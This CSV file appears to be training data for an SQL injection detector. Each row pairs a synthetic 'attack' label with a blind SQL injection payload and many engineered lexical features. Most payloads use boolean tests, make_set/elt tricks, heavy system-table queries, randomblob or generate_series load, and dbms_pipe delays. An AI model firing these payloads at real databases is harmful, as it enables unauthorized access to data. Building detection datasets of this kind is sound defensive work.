id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000433,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000049,0.022228868509525015,72.87619970883382,26.024760058233234,3.8198248467931983,13.999999999999996,24.0,23.90095976706706,10.975239941766766,0.19212997664712456,0.3293656742522135,0.32790920023849385,0.15059514886216796,0.0,1.0,3.0,0.0,0.0,2.0,0.0,2.9752399417667643,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000434,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'ltki'  =  'ltki,nearest_attack_euclidean,R000281,0.8576230250924819,135.42707826495422,26.786460867522884,3.2657337855203328,39.902771019938974,13.0,66.0,16.524307245015258,0.29424095072176754,0.09602986474372291,0.4875362363912086,0.12219294814330096,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.5243072450152566,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000435,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000171,1.831778026427537,130.864179804036,32.47198616892031,3.882135108877051,54.82428353713372,13.41595850676092,46.62393776014138,16.0,0.41076275522725786,0.10487183643966741,0.36123782106772934,0.12312758726534537,2.4719861689203064,1.1102230246251565e-16,0.0,0.7359930844601532,0.2640069155398468,1.0,0.0,7.943972337840613,0.0,0.0,1.5280138310796936,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2640069155398468,0.0,0.0,0.2640069155398468,0.2640069155398468,0.7359930844601532,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5280138310796934
SMOTE_000436,attack,boolean,-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,0.7047864609487918,67.3404694036874,20.08974889709507,3.0119134290728864,6.625360253296165,12.928777287597809,33.857554575195614,13.928777287597809,0.09470018760643739,0.19231471707529701,0.5055547177882602,0.20743037753000532,4.0,1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,4.4643886437989035,1.9999999999999998,0.2321943218994521,0.232194321899452,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000437,attack,boolean,"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000272,0.3186045039644264,138.2394681841805,39.07982272806017,3.9800570447132175,43.23946818418052,23.0,53.92017727193983,18.079822728060172,0.31276336095678636,0.16638360734730434,0.39007365513320735,0.13077937656270194,2.0798227280601713,0.9201772719398287,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.079822728060171,1.0,0.9201772719398287,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.07982272806017132,0.0,1.0,0.0,0.9201772719398287,0.07982272806017138,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0798227280601713
SMOTE_000438,attack,boolean,"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000073,0.012143340867135755,143.20560980110844,35.0,4.246356610714669,70.12149670065497,16.0,41.074767200403066,16.009345900050384,0.4896368443363455,0.11174868587337423,0.28680914209841885,0.11180532769186141,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.009345900050383,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000439,attack,boolean,"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",nearest_attack_euclidean,R000025,0.2340795012272248,99.1707647081605,26.75055882384007,3.3324343063943584,19.75055882384007,15.667411765120093,47.16852941280023,16.584264706400116,0.19944744291824,0.15787396327190892,0.4757268786440806,0.16695171516577054,0.0,4.0,1.0,0.0,0.0,1.916852941280023,0.0,7.8337058825600465,0.0,0.916852941280023,0.916852941280023,2.9168529412800233,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000440,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000031,0.006472317788561483,77.94191270803746,28.98212698708845,3.9505529704209295,20.973190480632677,21.0,25.973190480632674,9.995531746772112,0.2690589133373889,0.26947136748150163,0.3332187627377465,0.12825095644336293,0.0,1.0,2.0,0.0,0.0,2.0,0.0,2.9955317467721123,0.0,1.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000441,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000214,1.4948178761258584,61.89305602962938,23.874303896297167,3.6461570118197675,10.660415955555926,14.660415955555928,23.572224118517525,13.0,0.17266945119265134,0.237313681190435,0.3799231201241169,0.21009374749279677,0.0,4.0,0.5534719851853096,0.0,0.0,2.0,0.0,2.893056029629381,1.9999999999999998,0.5534719851853096,1.0,2.5534719851853094,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4465280148146906,0.5534719851853096,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000442,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000129,0.17249682710917383,123.72708743272793,35.19388998206078,3.8604308088939696,36.339307468606364,23.0,48.29083497309117,16.09694499103039,0.29359960357372317,0.1860066565952196,0.3902953048732929,0.1300984349577643,2.0,0.04847249551519539,2.0,1.0,0.0,2.0,0.0,8.048472495515195,0.0,0.0,1.0,5.0,1.0,0.04847249551519517,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.04847249551519517,0.9515275044848046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000443,attack,boolean,"1"" where 5440  =  5440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000085,0.35943287734120594,146.75495752920668,34.56126061769833,4.192093822080231,77.87747876460334,16.0,37.87747876460334,15.0,0.530687577031345,0.10911138500033793,0.25790911453050025,0.10229192343781682,0.0,0.8537535392327766,2.0,0.0,1.0,2.0,0.0,4.146246460767223,0.0,0.0,2.0,5.0,0.0,0.8537535392327766,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000444,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000060,0.20714434144016275,148.4315731866896,30.928071135551733,4.223598648316846,82.07192886444827,8.928071135551734,39.43157318668959,18.0,0.5529684306173129,0.06017332262993377,0.26557746039615504,0.12128078635659825,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,4.143857728896531,0.0,0.0,2.9280711355517344,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0719288644482656,0.9280711355517344,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000445,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000185,0.9284636185920955,68.6423541841326,22.284708368265196,3.407499634375994,13.0,14.569416736530394,29.430583263469607,11.642354184132598,0.18939671688113302,0.2120656623773392,0.428969379374188,0.16956824136733975,4.0,1.1102230246251565e-16,1.0,0.0,0.6423541841325984,2.0,0.0,4.0,0.0,0.0,0.0,3.642354184132598,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000446,attack,boolean,1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--,nearest_attack_euclidean,R000174,0.2680333921828469,62.456988982859734,20.72849449142987,3.3503771219990255,9.092741737144806,21.0,24.364247245714935,8.0,0.14421509482132458,0.3369929273841638,0.39041371974340155,0.12837825805111003,0.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,3.0,0.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000447,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",nearest_attack_euclidean,R000155,0.5138069561794741,74.73309353252867,24.733093532528677,3.7685371406572545,23.932374130114713,13.0,26.533812934942645,11.26690646747132,0.3201082380982678,0.17395851965353643,0.35513072761710857,0.15080251463108715,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.2669064674713213,0.0,4.0,0.0,1.0,1.0,1.2669064674713213,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000448,attack,boolean,"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",nearest_attack_euclidean,R000033,0.398307823661856,91.08310173244712,21.539437115649545,3.1140764807163475,19.925353269848937,12.385916154199393,45.07887423129909,13.692958077099696,0.21776426538785965,0.13548876538623125,0.4961122692268861,0.15063469999902296,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.1535209614501518,0.0,7.692958077099696,0.0,0.0,0.8464790385498481,1.1535209614501518,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000449,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000297,1.0460517497759603,142.3478997229889,32.44929990766296,4.149122299367784,72.14509935364076,16.0,39.20280036934814,15.0,0.5066220413700312,0.11241300258235705,0.275577766126652,0.10538718992095975,0.0,0.44929990766296485,2.0,0.0,1.0,2.0,0.0,4.550700092337035,0.0,0.0,2.0,5.0,0.0,0.4492999076629648,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000450,attack,boolean,"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'plfa'  =  'plfa",nearest_attack_euclidean,R000200,0.5467269793484365,151.34777805622946,30.0,3.9912158732071816,81.67388902811473,8.0,43.67388902811472,18.0,0.5397098311529561,0.05294644153727482,0.2882142338509007,0.11912949345886834,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,5.668472257028681,0.3315277429713183,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000451,attack,boolean,"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000013,1.0769183397414863,130.87260082361212,37.18683356211447,3.924736325828385,40.37366712422895,23.0,50.18683356211447,17.312100137268686,0.30736016990313814,0.1765513568042969,0.38396446339195633,0.13212400990060857,2.4373667124228953,1.1102230246251565e-16,2.0,1.0,0.0,2.0,0.0,8.437366712422895,0.0,0.0,1.0,5.437366712422895,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.43736671242289504,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.437366712422895
SMOTE_000452,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000240,1.6976640877182125,125.24839934025712,30.165599560171415,4.171863019892854,76.33119912034283,5.8344004398285865,29.917200219914292,13.165599560171414,0.6090241764973945,0.046990884921684836,0.23919044872448597,0.10479448985643469,0.0,1.6241996701285606,0.0,0.0,1.0,1.0,0.0,3.4586001099571466,0.0,0.0,2.541399890042854,2.0,0.0,0.5413998900428534,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000453,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000003,1.2890368378697366,65.0,23.918278937934105,3.464095131514335,24.16344212413179,4.081721062065894,26.75483681380232,10.0,0.3717452634481814,0.06279570864716759,0.4116128740584972,0.15384615384615385,0.0,0.0817210620658938,2.0,0.0,1.0,2.0817210620658937,0.0,1.8365578758682135,0.0,0.0,0.0,6.0,0.0,0.08172106206589369,1.0,0.08172106206589363,0.0,1.0,0.9182789379341064,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0817210620658937,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.081721062065894
SMOTE_000454,attack,boolean,"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000050,0.07603823425409616,135.65105850492392,34.0,3.7237970937682214,37.0,15.0,56.52084680393915,27.130211700984788,0.27279951509618067,0.11059439801196512,0.4166060868918542,0.2,0.0,1.0,2.0,0.0,0.0,1.0,0.0,12.130211700984788,1.0,2.0,1.0,9.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000455,attack,boolean,"1%""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000267,0.160831317996121,139.4291050674157,33.90485084456928,3.667927559100469,37.0,15.0,59.61940337827713,27.809701689138564,0.2654116797710885,0.10759932963692774,0.42755704525127164,0.19943194534071215,0.0,1.0,2.0,0.0,0.0,1.0,0.0,12.904850844569282,0.9048508445692831,2.0,1.0,9.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000456,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000076,1.2503944691521802,147.85137097165776,29.900210918716578,4.044575812389162,70.60084367486631,16.45010545935829,45.90021091871658,14.900210918716578,0.4772502474661493,0.11132635346126092,0.3107459453309021,0.10067745374168766,0.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.450105459358289,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.4501054593582894,0.5498945406417108,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000457,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000063,0.4053719417695076,80.89765063587811,28.793024954580133,3.9420342760990805,24.0,16.0,28.48370054503839,12.41395009083973,0.2980011684418792,0.19866744562791944,0.34983134420013423,0.15350004173006712,4.0,1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,4.413950090839732,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000458,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000270,0.2018581636851989,142.0,32.988753103254076,3.895502935066939,41.0,24.0,52.0,25.0,0.2887323943661972,0.16901408450704225,0.36619718309859156,0.176056338028169,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,10.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000459,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000227,1.213323079067735,118.81919036086445,29.734932530072037,3.463492616294544,34.67466265036019,13.0,53.409595180432234,17.73493253007204,0.2899637602959416,0.11104299659456798,0.44874938618712246,0.15024385692236789,0.0,1.7349325300720384,1.5100449799519744,0.0,1.0,1.0,0.0,9.734932530072038,0.7550224899759872,1.0,1.0,3.5100449799519744,0.0,1.0,0.7550224899759872,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.2449775100240128,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.244977510024013
SMOTE_000460,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000240,0.38197377555092943,128.0,31.21833593187669,4.294570775810735,78.63208788078421,3.8045839829691737,30.563328136246618,15.0,0.6143131865686267,0.029723312366946655,0.23877600106442667,0.1171875,0.0,3.0,0.0,0.0,1.0,1.0,0.0,3.390832034061654,0.0,0.0,2.8045839829691728,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000461,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000232,0.4852093587534339,81.58833035016471,26.19854129377059,3.84186119492955,20.0,24.0,27.19124776262354,10.39708258754118,0.24548769786885022,0.2945852374426203,0.33267091362295464,0.1272561510655749,0.0,0.19854129377058982,3.0,0.0,0.0,2.0,0.0,3.1985412937705897,0.0,1.0,1.0,5.0,0.0,0.19854129377058982,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000462,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,0.2283356816099987,106.92462688758347,33.0,3.761053295551692,32.0,15.0,43.584986848598156,16.33964003898532,0.2999540936453809,0.14060348139627227,0.40668144338987516,0.15276098156847173,2.0,1.0,2.0,1.0,0.0,1.0,0.0,8.33964003898532,0.0,0.0,1.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
